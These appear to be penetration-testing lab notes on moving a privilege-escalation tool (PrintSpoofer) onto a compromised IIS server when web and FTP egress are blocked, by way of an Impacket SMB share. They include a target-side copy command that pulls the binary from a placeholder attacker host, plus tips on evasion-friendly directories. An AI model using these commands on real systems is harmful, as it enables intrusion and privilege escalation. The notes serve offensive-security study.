## File Transfer Tactics & Egress Bypasses

>[!INFO] **Scenario Context:** We gained RCE on an IIS web server via unrestricted file upload. Initial access was a web shell, upgraded to a reverse shell. The objective was to transfer `PrintSpoofer.exe` to exploit `SeImpersonatePrivilege`.


### 1. Environmental Constraints & Blocked Methods

During the engagement, several common transfer vectors were neutralized by host and network-level security controls:

- **Application Control Policy:** Blocked `PowerShell.exe`, preventing the use of `Invoke-WebRequest` or `System.Net.WebClient`.
    
- **Web Content Filtering:** Prevented `certutil.exe` or browser-based downloads from common repositories like GitHub or cloud storage (Dropbox/Drive).
    
- **Port Filtering (Egress):** * **TCP/21 (FTP):** Blocked by the network firewall.
    
    - **TCP/445 (SMB):** **Allowed.** This was the critical discovery that enabled the transfer.
        

### 2. Successful Vector: SMB Inbound/Outbound

When standard web and FTP ports are filtered, SMB is often left open within Windows environments for internal file sharing and printing.

>[!TIP] **Technique: Impacket SMB Server** On the attack machine (Pwnbox/Linux), we can host a folder as an SMB share. Since the target allows outbound traffic on Port 445, it can connect back to our machine to "copy" the binary.

**Command Example:**

Bash

```
# On Attack Machine:
sudo impacket-smbserver -smb2support public /path/to/local/folder

# On Target Machine:
copy \\<ATTACKER_IP>\public\PrintSpoofer.exe C:\Windows\Temp\PrintSpoofer.exe
```

### 3. Key Enumeration & Exploitation Findings

- **Privilege Escalation Vector:** The user possesses `SeImpersonatePrivilege`.
    
- **Tool Choice:** `PrintSpoofer` or `RoguePotato` are primary choices for this privilege. These tools exploit the ability of a service to impersonate a client to gain `NT AUTHORITY\SYSTEM` tokens.
    
- **Host-Based Security:** Always check for AV/EDR. Even if the transfer is successful, the binary might be deleted upon disk write.
    

---

### Summary Table: Transfer Method Comparison

| Method                  | Protocol   | Common Tool                | Weakness                                   |
| ----------------------- | ---------- | -------------------------- | ------------------------------------------ |
| **Web**                 | HTTP/HTTPS | Certutil, PowerShell, Wget | Content filters, Proxy logs                |
| **FTP**                 | FTP        | Windows FTP Client         | Cleartext (usually), Port 21 often blocked |
| **SMB**                 | SMB/CIFS   | Impacket, Net Use          | Requires Port 445; easily logged by EDR    |
| **Living off the Land** | Various    | Bitsadmin, Diantz          | Monitoring of "suspicious" LOLBAS binaries |

Export to Sheets

>[!IMPORTANT] Always prioritize transfers to "world-writable" or low-profile directories such as `C:\Windows\Temp\` or `C:\Users\Public\` to minimize permission issues during the initial landing.

